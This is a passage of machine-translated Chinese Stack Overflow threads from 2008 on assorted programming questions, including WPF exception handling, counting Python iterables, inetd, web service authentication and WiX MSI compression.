        return new Weight(newVal, newUnit);
    }
}; 
```

这里的好处是您可以根据数据（可能是 XML 文件或资源）将所有 WeightUnits 创建为单例对象，这样您就可以添加一个新单元而无需更改任何代码。创建一个权重对象只需按名称查找正确的单例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T05:34:01.877

我想我会把它变成一个`struct`，无论如何大多数原语都是。

# sql - 通过 Excel 宏将 Excel 单元格数据导出到数据库？

> ID：390829
> 
> 赞同：0
> 
> 时间：2008-12-24T05:34:49.627
> 
> 标签：sql, excel, ms-access

我可以为 Excel 创建一个用 C# 编写的宏，允许我将单元格的数据导出到 SQL Server 或 Access 数据库吗？

基本上，我想在 Excel 中创建一个按钮，将某些单元格中的数据保存到数据库中。这可以做到吗？

我决定使用 Excel 作为用户环境，而不是从头开始为程序创建 UI，而不是更适合业务需求。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T13:22:09.093

[如何使用 Visual C# 自动化 Excel 以使用数组填充或获取范围内的数据](http://support.microsoft.com/kb/302096)将是一个很好的起点。

请注意，您会发现控制人们尝试输入 Excel 工作表的内容令人沮丧，因为数据的继承灵活性再次使您努力将其写入数据库目标。

# c# - 我如何帮助初级成员对他们重构代码的能力充满信心？

> ID：390834
> 
> 赞同：7
> 
> 时间：2008-12-24T05:39:12.023
> 
> 标签：c#, refactoring

我想看看人们认为什么是帮助初级成员对他们重构代码的能力充满信心的最佳方式。我发现初级开发人员通常只是简单地遵循现有模式，并且由于感知到的风险而厌恶破坏任何东西。我试图让他们查看需求（新的和现有的）并将代码映射到域模型上，而不是“调整”或“弯曲”现有代码库以支持新功能。只是想看看这里有没有成功的人。我们目前正在考虑推动更多的结对编程、TDD、代码审查等，但想检查是否有其他成功案例......

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-12-24T05:45:51.807

唯一可靠的答案是单元测试恕我直言。不一定是 TDD——只是让他们为他们想要重构的现有方法/类编写测试，确保他们正在做他们正在做的事情，然后让他们疯狂地重构，同时依靠测试来确保方法仍然有效。

单元测试允许的置信度和灵活性在这些活动中非常有价值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-24T06:24:00.090

**与高级开发人员结对编程并结合编写测试**似乎是最佳情况。如果这对中更有经验的开发人员处于领先地位，那么测试将只是其中的一部分。

单独编写测试留下了改进的空间。在结对环境中编写测试是两全其美的，因此应该更快地建立信心。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-24T05:47:04.847

我建议您在开始大量重构之前进行单元测试，如果您有良好的代码覆盖率，只需运行测试，您就可以查看是否有一些测试失败，重构会影响所需的程序行为。

基本上，单元测试可以给你团队重构所需的信心。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-24T07:02:03.023

无论如何，你应该推动“更多的结对编程、TDD、代码审查等”。您还应该确保您的程序员（无论是在年限上还是在习惯上的初级）都精通基础知识。

我建议他们阅读 McConnell 的*Code Complete*和 Fowler 的*Refactoring*。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-24T05:47:39.337

我同意 - 单元测试和结对编程。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T05:49:31.267

第一步是让他们为想要重构的任何东西编写测试，然后再重构。我还认为与更高级的开发人员进行代码审查以及结对编程有一些优点。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-24T06:38:49.687

我的建议是采用一个随着时间的推移会发生很大变化的系统，让初级开发人员给出他们想要应用哪些基础知识的计划，例如是否缺少单元测试，使用什么设计模式可能有意义添加新功能，你觉得这是“好”的代码吗？如果不是，你会对它做些什么改变？其中一部分是让他们进入代码并对其感到满意，因为当开发人员不知道系统内的任何内容时，他们可能希望进行最小的更改，以免破坏某些东西并随后产生负面影响。如果可以有一位高级成员可以充当导师，并指导初级开发人员提出的建议与所寻求的内容更匹配，那么这可能是一件大事。

请注意，对于上述内容，高级成员可能必须非常熟悉，并且在某种程度上已经计划好如何进行初级开发人员将要做的更改，但想法是让初级开发人员更多地参与代码这就是我的看法。如果初级开发人员能够养成投入事情的习惯并被鼓励这样做，那么我可以在那里看到一些成功。关键是要知道如何纠正初级开发人员的建议，同时鼓励他们在整个过程中付出更多，而不是被告知要做什么。

有些人更有可能脱颖而出并抓住机会，关键是让团队看看结果如何，因为你最终想要的是一群初级开发人员，他们都在研究高级开发人员最初可能拥有的各种解决方案构建系统或将各种产品集成在一起，因此可以就应该做什么提供意见，但在完成工作时充当指导而不是父母。

另一种查看方式是从初级开发人员的角度简单地可视化事物。如果他们提出了一些建议并得到了一些东西，例如表扬或更好的分配，那么这可能会使事情进展顺利，尽管人们必须小心给予的东西，因为如果事情变得太高，要继续提高一个档次可能会遇到问题。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-24T07:20:56.683

*   要求他们编写或调查现有的测试用例
*   运行那些测试用例，记录结果
*   要求他们重构代码
*   查看重构代码
*   运行测试用例匹配之前的观察

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-24T09:28:56.660

另外，尝试做一些编码道场。一对坐在投影仪前编程，每五分钟轮换一名显影剂。让他们谈谈他们是如何重构的，以及为什么重构。

见： http: [//www.codingdojo.org/](http://www.codingdojo.org/)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-12-24T10:16:50.777

我相信这个问题并不特定于 C#，所以我建议尝试使用 Java 使用[Eclipse](http://www.eclipse.org)。Eclipse 拥有迄今为止我见过的最好的重构工具（尽管我从未尝试过 IntelliJ IDEA 或 Resharper）。通过 Eclipse 学习重构，我受益匪浅，尤其是在执行任何更改之前使用预览窗口。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-12-24T11:42:48.933

我会推荐结合书籍、工具、编码和指导。

最重要的是 - 让候选人购买或借用 Martin Fowler 的 Refactoring 并阅读它。

如果你有一个好的源代码控制系统——创建一个单独的分支来玩应该是微不足道的。此外，如果练习的最终结果有用，您可以轻松地将其合并到主干中。

接下来，选择一个您知道需要他们理解应用程序结构的特定任务。例如，要求他们检测系统的一部分。这提供了一个可以在其中工作的任务，而不是一般指令（例如阅读框架文档或阅读此代码）

下一部分是要求编写测试以支持此任务涉及的功能。审查测试并鼓励编写综合测试。使用 NUnit 之类的工具很重要，或者如果您的 IDE 支持单元测试，请使用它。鼓励这个人提出问题并找出事情为什么会这样。

如果您使用的 IDE 支持它，请在 IDE 中引入重构工具并鼓励他们重构代码。使用结对编程或定期代码审查来指导这个人。这些测试可用于展示单元测试如何成为良好重构工作的重要组成部分。从小处着手——可能是更改事物的名称或将字段提取到属性中，然后再转向更复杂的。

希望在练习结束时，该人不仅可以轻松地质疑、调整和更改应用程序，而且您还可以从中获得一些有用的功能:-)

# wpf - WPF - DispatcherUnhandledException 似乎不起作用

> ID：390838
> 
> 赞同：12
> 
> 时间：2008-12-24T05:43:08.083
> 
> 标签：wpf, exception-handling

我在 VS2008 中开始了一个新的 WPF 项目，然后在 trap 中添加了一些代码`DispatcherUnhandledException`。然后我添加了一个抛出异常，`Window1` 但错误没有被处理程序捕获。为什么？

```
 public App()
    {
        this.DispatcherUnhandledException += new DispatcherUnhandledExceptionEventHandler(App_DispatcherUnhandledException);

    }

    void App_DispatcherUnhandledException(object sender, DispatcherUnhandledExceptionEventArgs e)
    {
        System.Windows.MessageBox.Show(string.Format("An error occured: {0}", e.Exception.Message), "Error");
        e.Handled = true;
    }

 void Window1_MouseDown(object sender, MouseButtonEventArgs e)
    {
        throw new NotImplementedException();
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-24T17:29:48.577

这可能是因为您使用调试器处理异常的方式 - 调试/异常...应该允许您准确配置您希望如何处理它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-12-03T08:30:34.940

看看下面的 msdn 链接[http://msdn.microsoft.com/en-us/library/system.windows.application.dispatcherunhandledexception.aspx](http://msdn.microsoft.com/en-us/library/system.windows.application.dispatcherunhandledexception.aspx) 以下是相关的

如果在后台用户界面 (UI) 线程（具有自己的 Dispatcher 的线程）或后台工作线程（没有 Dispatcher 的线程）上未处理异常，则不会将异常转发到主 UI 线程。因此，不会引发 DispatcherUnhandledException。在这些情况下，您将需要编写代码来执行以下操作：

1.  处理后台线程上的异常。
2.  将这些异常分派到主 UI 线程。
3.  在主 UI 线程上重新抛出它们而不处理它们以允许引发 DispatcherUnhandledException。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-03-02T17:16:06.637

这就是我的处理方式。这不是很漂亮，但请记住，这种类型的错误绝不应该通过作为开发人员的调试。在你投入生产之前，这些错误应该早就解决了（所以这不是很好）。在Startup项目中，在App.xaml(App.xaml.cs)代码后面，我放了如下代码。

*   OnStartup，创建 DispatcherUnhandledException 事件处理程序
*   在处理程序中，使用 MessageBox 来显示消息。请注意，它可能尚未创建启动窗口，因此不要尝试将其放在窗口中。
*   e.处理错误
*   我想看看什么时候有额外的内部错误，所以我继续调用显示窗口，直到内部错误为空。

我不确定为什么代码块特殊字符的格式不正确。对于那个很抱歉。

```
protected override void OnStartup(StartupEventArgs e)
    {
        // define application exception handler
        Application.Current.DispatcherUnhandledException += 
            AppDispatcherUnhandledException;

        // defer other startup processing to base class
        base.OnStartup(e);
    }

    private void AppDispatcherUnhandledException(object sender, DispatcherUnhandledExceptionEventArgs e)
    {
        runException(e.Exception);

        e.Handled = true;   
    }

    void runException(Exception ex)
    {
        MessageBox.Show(
            String.Format(
                "{0} Error:  {1}\r\n\r\n{2}",
                ex.Source, ex.Message, ex.StackTrace,
                "Initialize Error",
                MessageBoxButton.OK, 
                MessageBoxImage.Error));

        if (ex.InnerException != null)
        {
            runException(ex.InnerException);
        }
    } 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-16T19:01:20.990

起初，即使在调试环境之外，我的处理程序似乎也没有触发......然后我意识到我忘记设置 e.Handled = true。

事实上，它正在工作，但因为 e.Handled 仍然是错误的，标准异常处理程序仍然启动并完成了它的工作。

一旦我设置了 e.Handled = true，那么一切都变得很糟糕。因此，如果它不适合您，请确保您已完成该步骤。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-24T07:32:07.847

对于那些有兴趣的人

IDE 似乎仍在处理异常，如果您在 IDE 中单击“继续”，它会调用错误处理程序。

# network-programming - 使用inetd 还是不使用inetd... 我应该什么时候将inetd 用于我的网络服务器程序？

> ID：390847
> 
> 赞同：5
> 
> 时间：2008-12-24T05:49:05.200
> 
> 标签：network-programming, inetd

谁能给出一组简明的现实世界考虑因素，以推动选择是否使用 inetd 来管理充当网络服务器的程序？

（如果使用inetd，我认为它改变了程序中围绕网络代码的要求，所以我认为它肯定是与编程相关的，而不是一般的IT）

这个问题是基于我看到的一个实现，它使用由inetd 管理的控制程序来启动一个网络侦听器，然后它会永远运行并承受恒定和沉重的负载。它似乎不太适合教科书的 inetd 使用配置文件（按需、不经常使用、轻量级），这让我对更一般的问题感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T06:38:39.763

这取决于您的服务的使用模式。如果您的守护程序的启动时间很短，并且您希望它不经常使用，那么 int 可能是一个不错的选择。它减少甚至消除了编写任何额外网络代码的需要。

如果您的守护程序更重量级或更频繁使用，您最好单独编写它。您可以轻松地编写`init.d`脚本和一些`conf.d`配置来配合它，管理员管理起来也不会困难。如今，大多数编程语言都具有易于使用的套接字库，因此在许多情况下，网络代码甚至可能没有那么困难。

根据我的经验，我发现现在很少有管理员熟悉 inetd。大多数守护进程只提供自己的初始化脚本。事实上，在我管理的几百个系统中，我根本想不出一个可以通过 inetd 启动任何东西的系统。这是值得考虑的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T05:58:08.957

从操作的角度来看，挂钩 inetd 将使您的服务更易于管理，因为 inetd 允许系统管理员几乎控制所有与您的程序进行网络通信的方式。但是，它需要您对程序进行一些代码更改。此外，它可能不如让您的程序从一开始就作为守护程序运行那么有效。

编辑：我个人从不使用 inetd 并且总是选择将服务器进程编写为独立的守护进程。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-24T06:40:06.830

我认为在决定使用 inetd 时另一个值得考虑的因素是处理请求的进程平均消耗多少内存？如果这相当高，那么在高负载下，您可能会耗尽内存（因为 inetd 分叉）。同一个服务器可能以多线程或选择轮询方式实现，可能允许每个连接更高的负载/更少的内存。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T05:54:43.940

您正在考虑什么替代策略？

inetd 是确保您的服务器在操作系统以适当的运行级别启动时启动的好方法。即使您确实将服务器设计为具有其他一些管理机制，inetd 仍然可以非常简单地包装所有命令。毕竟只是shell脚本。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-08-21T04:06:02.603

您可以使用 inetd 为通过 stdin/stdout 运行的简单程序提供 TCP/UDP 功能。

Without inetd, your program will need to manage a slew of concerns, including network interfaces, sockets, forking, resource limits, etc.

# python - 是否有任何内置方法可以在 python 中获取可迭代的长度？

> ID：390852
> 
> 赞同：77
> 
> 时间：2008-12-24T05:55:37.947
> 
> 标签：python, iterator

例如，Python 中的文件是可迭代的——它们迭代文件中的行。我想计算行数。

一种快速的方法是这样做：

```
lines = len(list(open(fname))) 
```

但是，这会将整个文件加载到内存中（一次）。这反而违背了迭代器的目的（只需要将当前行保留在内存中）。

这不起作用：

```
lines = len(line for line in open(fname)) 
```

因为发电机没有长度。

除了定义计数函数之外，还有什么方法可以做到这一点？

```
def count(i):
    c = 0
    for el in i: c += 1
    return c 
```

为了澄清，我知道必须阅读整个文件！我只是不想一下子在记忆中

* * *

## 回答 #1

> 赞同：87
> 
> 时间：2008-12-24T06:23:35.833

没有遍历可迭代对象并计算迭代次数，没有。这就是使它成为可迭代而不是列表的原因。这甚至不是一个特定于 python 的问题。看看经典的链表数据结构。查找长度是一个 O(n) 操作，涉及迭代整个列表以查找元素的数量。

正如上面提到的 mcrute ，您可能可以将您的功能简化为：

```
def count_iterable(i):
    return sum(1 for e in i) 
```

当然，如果您要定义自己的可迭代对象，您总是可以`__len__`自己实现并在某处保留元素计数。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2008-12-24T06:03:06.747

如果您需要计算行数，您可以这样做，我不知道有什么更好的方法：

```
line_count = sum(1 for line in open("yourfile.txt")) 
```

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2015-02-07T18:04:18.553

该`cardinality`包提供了一个高效的`count()`函数和一些相关的函数来计算和检查任何迭代的大小：[http://cardinality.readthedocs.org/](http://cardinality.readthedocs.org/)

```
import cardinality

it = some_iterable(...)
print(cardinality.count(it)) 
```

在内部，它使用`enumerate()`and`collections.deque()`将所有实际的循环和计数逻辑移动到 C 级别，从而大大提高了`for`Python 中的循环速度。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2008-12-24T07:49:02.383

我已经使用这个重新定义一段时间了：

```
def len(thingy):
    try:
        return thingy.__len__()
    except AttributeError:
        return sum(1 for item in iter(thingy)) 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2016-12-12T17:48:12.220

事实证明，这个[常见问题](https://stackoverflow.com/questions/393053/length-of-generator-output/41106706#41106706)有一个已实施的解决方案。考虑使用`ilen()`函数 from [`more_itertools`](http://more-itertools.readthedocs.io/en/latest/api.html#more_itertools.ilen)。

```
more_itertools.ilen(iterable) 
```

在文件中打印多行的示例（我们使用该`with`语句来安全地处理关闭文件）：

```
# Example
import more_itertools

with open("foo.py", "r+") as f:
    print(more_itertools.ilen(f))

# Output: 433 
```

此示例返回的结果与之前为文件中的总计行提供的解决方案相同：

```
# Equivalent code
with open("foo.py", "r+") as f:
    print(sum(1 for line in f))

# Output: 433 
```

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2008-12-24T06:54:08.033

绝对不是，原因很简单，可迭代对象不能保证是有限的。

考虑这个完全合法的生成器函数：

```
def forever():
    while True:
        yield "I will run forever" 
```

试图计算这个函数的长度`len([x for x in forever()])`显然是行不通的。

正如您所指出的，迭代器/生成器的大部分目的是能够处理大型数据集，而无需将其全部加载到内存中。您无法立即获得长度这一事实应被视为一种权衡。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2018-11-08T15:26:37.873

因为显然当时没有注意到重复，所以我也会在此处发布[我对重复的答案](/a/34404546/364696)的摘录：

有一种方法可以比`sum(1 for i in it)`当迭代可能很长时执行得更快（当迭代很短时不会显着变慢），同时保持固定的内存开销行为（与 不同`len(list(it))`）以避免较大输入的交换抖动和重新分配开销。

```
# On Python 2 only, get zip that lazily generates results instead of returning list
from future_builtins import zip

from collections import deque
from itertools import count

def ilen(it):
    # Make a stateful counting iterator
    cnt = count()
    # zip it with the input iterator, then drain until input exhausted at C level
    deque(zip(it, cnt), 0) # cnt must be second zip arg to avoid advancing too far
    # Since count 0 based, the next value is the count
    return next(cnt) 
```

像`len(list(it))`，`ilen(it)`在 CPython 上用 C 代码执行循环（`deque`，`count`并且`zip`都是用 C 实现的）；避免每个循环执行字节码通常是 CPython 性能的关键。

我不会在这里重复所有性能数字，而是[用完整的性能细节向您指出我的答案](/a/34404546/364696)。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-06-26T06:12:42.423

对于过滤，可以使用此变体：

```
sum(is_good(item) for item in iterable) 
```

它可以自然地读作“count good items”，并且比：

```
sum(1 for item in iterable if is_good(item))) 
```

`True`注意：在数字上下文中计算的事实`1`在文档（[https://docs.python.org/3.6/library/stdtypes.html#boolean-values](https://docs.python.org/3.6/library/stdtypes.html#boolean-values)）中指定，所以这种强制不是黑客（而不是其他一些语言，如 C/C++）。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-24T06:39:10.030

如果您考虑一下，我们将如何建议您在不读取整个文件的换行符的情况下找到文件中的行数？当然，你可以找到文件的大小，如果你能保证一行的长度是x，你就可以得到一个文件的行数。但除非你有某种约束，否则我根本看不出这是如何工作的。此外，由于迭代可以无限长......

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2017-12-13T03:22:31.760

我在我的一些代码中的两个常用程序之间进行了测试，它找到了 n 个顶点上有多少个图，以查看哪种计算生成列表的元素的方法更快。Sage 有一个生成器 graphs(n)，它在 n 个顶点上生成所有图。我创建了两个函数，它们以两种不同的方式获取迭代器获得的列表的长度，并使用 time.time() 函数对它们中的每一个进行计时（平均超过 100 次测试运行）。功能如下：

```
def test_code_list(n):
    l = graphs(n)
    return len(list(l)) 
```

和

```
def test_code_sum(n):
    S = sum(1 for _ in graphs(n))
    return S 
```

现在我为每种方法计时

```
import time

t0 = time.time()
for i in range(100):
    test_code_list(5)
t1 = time.time()

avg_time = (t1-t0)/10

print 'average list method time = %s' % avg_time

t0 = time.time()
for i in range(100):
    test_code_sum(5)
t1 = time.time()

avg_time = (t1-t0)/100

print "average sum method time = %s" % avg_time 
```

平均列表方法时间 = 0.0391882109642

平均求和方法时间 = 0.0418473792076

因此，以这种方式计算 n=5 个顶点上的图数，list 方法稍微快一些（尽管 100 次测试运行并不是一个很好的样本量）。但是，当我通过在 n=7 个顶点上尝试图形来增加正在计算的列表的长度时（即将图形（5）更改为图形（7）），结果是这样的：

平均列表方法时间 = 4.14753051996

平均求和方法时间 = 3.96504004002

在这种情况下，sum 方法稍微快一些。总而言之，这两种方法的速度大致相同，但差异可能取决于您列表的长度（也可能只是我平均只进行了 100 多次测试，这不是很高 - 会永远花费除此以外）。

# c# - 对 Web 服务的访问控制

> ID：390853
> 
> 赞同：1
> 
> 时间：2008-12-24T05:55:56.077
> 
> 标签：c#, asp.net, web-services, iis, certificate

这是我希望达到的目标：

我的 ASP.NET Web 服务托管在名为**//service**的服务器上。我想通过服务器和应用程序控制对 Web 服务的访问。我的意思是，如果我在名为**//web1**的服务器上托管了两个 ASP.NET Web 应用程序（app1 和 app2），并且我只希望**//web1/app1**能够调用 Web 服务。我知道我可以授予对**//web1**的 IP 地址的访问权限，但这将允许**//web1/app1**和**//web1/app2**访问 Web 服务。

我正在考虑使用 SSL 证书，因为我不希望 Web 应用程序处理登录名/密码。在**//service**上，我将授予对 //web1 的 IP 的访问权限，并将**客户**端证书从**//web1**映射到 Windows 帐户，这将只允许来自**//web1**的应用程序访问。但是，我该如何进一步控制对**//web1/app1**的访问？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T07:28:37.963

您可以使用标准[HTTP 身份验证](http://en.wikipedia.org/wiki/Basic_access_authentication)来控制哪些应用程序可以访问您的 Web 服务。

凭据在每个请求的**Authorization标头中传递。**每个 Web 服务客户端（即 //web1/app1）都应该有自己的凭据，因此如果 //web1/app2 尝试在不提供可识别凭据的情况下连接到 Web 服务，它将被拒绝访问。

我建议使用 SSL 加密所有流量，以确保身份验证信息和其他敏感数据的安全。

这里有几篇文章可能会有所帮助：

*   [HTTP 安全性和 ASP.NET Web 服务（请参阅身份验证部分）](http://msdn.microsoft.com/en-us/library/ms996415.aspx#httpsecurity_topic3)
*   [ASP.NET Web 服务中的身份验证](http://progtutorials.tripod.com/Authen.htm)

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-16T18:18:35.807

并不真地。

证书保护客户端和服务器域之间的传输。为多个子目录拥有多个证书并没有真正的作用。

您想要做的是创建一个返回令牌的登录服务。然后，您使用该令牌来管理服务器端的会话，客户端使用它以及每个后续请求来访问和执行可用服务。（这个令牌可以访问这个网络服务吗？t/f）

您将不得不授予客户端访问某种凭据的权限。无论是证书交换还是用户/通行证，您都必须弄清楚客户实际上是谁。

# visual-studio-2008 - WiX 生成的 MSI 未压缩

> ID：390860
> 
> 赞同：7
> 
> 时间：2008-12-24T06:02:42.380
> 
> 标签：visual-studio-2008, compression, wix, windows-installer

我使用 WiX3 生成 MSI 安装包。`<Package>`我在和`<Media>`元素中都指定了压缩标志：

```
<Package InstallerVersion="200" Compressed="yes"/>
<Media Id="1" Cabinet="MySetup.cab" EmbedCab="yes" CompressionLevel="high" /> 
```

但生成的 MSI 根本没有压缩 - WinZip 将其从 2M 压缩到 600K。

我错过了什么吗？

我正在使用 VS2008 顺便说一句。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-25T20:05:45.830

MSI 文件不是 OLE 结构化存储文件。它们不能被压缩，并且 Windows Installer 仍然能够读取它们。但是，很多东西都存储在 MSI 文件中（例如您的 UI 图形和 CustomAction DLL 和快捷方式图标），因此您应该注意放入 MSI 中的内容。

WiX 工具集中没有任何内容可以分析您将它们放入 MSI 并对其进行压缩的每一件事（当然，除了 cab 文件，因为 Windows Installer 预计会对其进行压缩）。

老实说，Windows 安装程序本身并不支持当今最好的压缩。要做的一件事是构建包并使用引导程序分发压缩内容并在将其传递给 Windows Installer 之前解压缩。这就是 WiX v3.5 的烧录引导程序的计划。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T10:51:05.793

你的问题中缺少一些东西。但是你怎么知道它没有被压缩。如果 Winzip 可以进一步压缩它，并不总是意味着它没有被压缩。您可以使用[7-zip](http://7-zip.org/)来调查生成的 msi 文件。里面应该有驾驶室，解压出来，看看解压前后的大小。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-29T06:20:56.333

对于巨大的位图，我建议在 Photoshop 中编辑它们以缩小它们。通过将它们更改为索引调色板（图像>模式>索引），然后将生成的文件保存为 8 位压缩 BMP，我设法将两个 600K 位图降低到约 35k。

试一试 ;）

# asp.net - 在 ASP.Net Web 应用程序中运行后台任务并获得反馈的最佳方式？

> ID：390863
> 
> 赞同：4
> 
> 时间：2008-12-24T06:03:21.707
> 
> 标签：asp.net, multithreading

我正在考虑以下方法，但不确定它是否是最好的方法：

step1（服务器端）：TaskMangaer 类创建一个新线程并启动一个任务。
step2（服务器端）：将taskManager对象引用存储到缓存中以备将来参考。
step3（客户端）：使用周期性的Ajax调用来检查任务的状态。

基本上，目的是有一个框架来运行后台任务（大约 5 分钟），并在 Web UI 上提供关于任务完成百分比的定期反馈。

有没有一种巧妙的方法来解决这个问题或任何现有的 asp.net API 会有所帮助？

**编辑 1#：**我想在应用程序中运行任务。

**编辑 2#：**看起来堆栈溢出的徽章实现也在使用缓存来跟踪后台任务。[https://blog.stackoverflow.com/2008/07/easy-background-tasks-in-aspnet/](https://blog.stackoverflow.com/2008/07/easy-background-tasks-in-aspnet/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T06:16:33.583

Microsoft 消息队列是为您尝试解决的场景而构建的：http: [//www.microsoft.com/windowsserver2003/technologies/msmq/default.mspx](http://www.microsoft.com/windowsserver2003/technologies/msmq/default.mspx) Windows Communicatio Foundation 也支持消息队列。希望这可以帮助。

托马斯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T07:40:40.530

一种方法是使用应用程序状态。当您生成工作线程时，将您生成的请求 ID 传递给它，并将其返回给客户端。然后，客户端将在其 AJAX 调用中将该请求 ID 传递回服务器。然后，服务器将使用来自应用程序状态的请求 ID 获取状态。（工作线程将根据其状态更新应用程序状态）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T09:47:45.500

我认为将结果存储在缓存中的问题在于 ASP.NET 可能会出于其他目的（即内存不足、脾气暴躁等）清除该缓存条目。从缓存中提供的内容应该是您可以按需重新创建的内容，如果在缓存中找不到它，ASP.NET 运行时可以随时转储缓存条目。

徽章讨论中缓存的使用似乎根本不同，在这种情况下，任务是短暂的。缓存只是被用作一个 hacky 计时器来定期触发任务。

你能确认这是一个需要 5 分钟的任务，并且一直需要它自己的线程吗？这本身就是一个性能问题，如果每个请求都需要自己的线程这么长时间，您将只能支持有限数量的此类请求。只有在可接受的情况下，我才会让任务驻扎这么长时间。

如果这些任务可以驻留线程，那么我将继续并将结果存储在进程的全局字典中。字典的键与客户端请求/AJAX 回调系列相关。如果安全性非常重要，密钥也应该包含用户 ID。

如果您需要扩展到许多用户，那么我认为您需要将任务分解为异步步骤，在这种情况下，我可能会使用数据库表来存储结果（再次为每个请求/用户键入）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T14:03:00.133

我在某处看到了解决类似问题的方法。解决方案类似于：

1.  在服务器上启动后台任务。立即返回结果的 url。
2.  在发布结果之前，此 url 将返回 404。
3.  客户端会定期检查此 url。
4.  客户在最终发布结果时读取结果。

该网址将类似于[http://mysite/myresults/cffc6c30-d1c2-11dd-ad8b-0800200c9a66](http://mysite/myresults/cffc6c30-d1c2-11dd-ad8b-0800200c9a66)。最好的文档格式可能是 JSON。

如果对进度的反馈很重要，请修改文档以包含状态（进行中/完成）和进度（42%）。

# sharepoint - 在 SPGridView 中的绑定字段内包装文本

> ID：390864
> 
> 赞同：0
> 
> 时间：2008-12-24T06:05:16.820
> 
> 标签：sharepoint, moss, web-parts

我在 SPGridView 内的列中显示一些文本。文本恰好超过一百个字符长，因此，Webpart 变得太宽。

我尝试将 BoundField.ItemStyle.Wrap 设置为 true，并且我还尝试了 BoundField.ControlStyle.Width 和 BoundField.ItemStyle.Width 值，但它们不起作用......

我如何使文本换行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-23T22:13:35.323

该列有自己的宽度属性 - 请参阅[http://msdn.microsoft.com/en-us/library/microsoft.imm.sdk.sharepoint.medialibrary.column.width.aspx](http://msdn.microsoft.com/en-us/library/microsoft.imm.sdk.sharepoint.medialibrary.column.width.aspx)

# python - 从 wx 框架类调用应用程序方法

> ID：390867
> 
> 赞同：1
> 
> 时间：2008-12-24T06:07:30.733
> 
> 标签：python, wxpython, wxwidgets, model-view-controller, project-organization

我从 wxPython 开始，并且一直在努力完成我可以掌握的每一个教程和示例。然而，我遇到了一个小问题，它与 wx.App 与 wx.Frame 有关，并且应该包含特定的方法。几乎我见过的每个示例都没有超出布局/大小调整和事件处理，没有一个真正解决 wxPython 项目的项目组织。

例如，我有一个获取文件夹列表的方法。大多数示例处理此问题的方式是将方法直接粘贴在框架类中。此方法有可能在应用程序的其他几个部分中使用，因此将其存储在应用程序类级别会更有意义。

我应该如何组织和调用这样的“通用”方法，以免我的框架类混乱。

**更新：**

为了澄清，“文件夹列表”只是一个例子，我的实际方法做了更多的工作。我要说的是我的代码不是特定于框架的。如果我在应用程序类中有这个，那么从我的框架中的事件方法和事件方法中调用它的最佳方法是什么。

我正在寻找实际的项目组织技术，而不是编程基础。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T06:39:56.673

正如马克所说，你应该创建一个新的类来处理这样的事情。

使用 wxWidgets 之类的代码时，理想的代码布局是模型视图控制器，其中 wxFrame 类只有显示项目所需的代码，所有逻辑和业务规则都由与 wxFrame 交互的其他类处理。通过这种方式，您可以更改逻辑和业务规则，而无需更改您的界面和更改（或交换）您的界面，而无需更改您的逻辑和业务规则。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-26T22:01:47.887

从 wxWidgets/wxPython 数据类型继承的类不应实现任何业务逻辑。wxWidgets 是一个 GUI 库，因此 wxApp 或 wxFrame 的任何子类都应该专注于 GUI，即显示界面和响应用户操作。

有用的代码应该从 wx 中分离出来，因为您可以稍后决定在某些 Web 或控制台应用程序中使用它，并且您不想在这种情况下创建 wxApp 对象。您还可以稍后决定将一些计算移动到单独的“工作线程”，而您的 GUI 将成为“主线程” - 响应式，并在长期计算期间正确重新绘制。

最后但并非最不重要的一点 - 封装逻辑的类可能会在项目生命周期内增长。如果它们与您的 GUI 类混合在一起，它们会增长得更快，最后它们变得如此复杂以至于您几乎无法调试它们......

当您不将逻辑中的错误与 GUI 中的错误（刷新/布局/进度条等）混合时，将它们分开会导致干净的代码。这种方法还有另一个很好的特性——能够在 GUI 人员和逻辑人员之间拆分工作，他们可以在没有持续冲突的情况下完成他们的工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-28T08:55:34.727

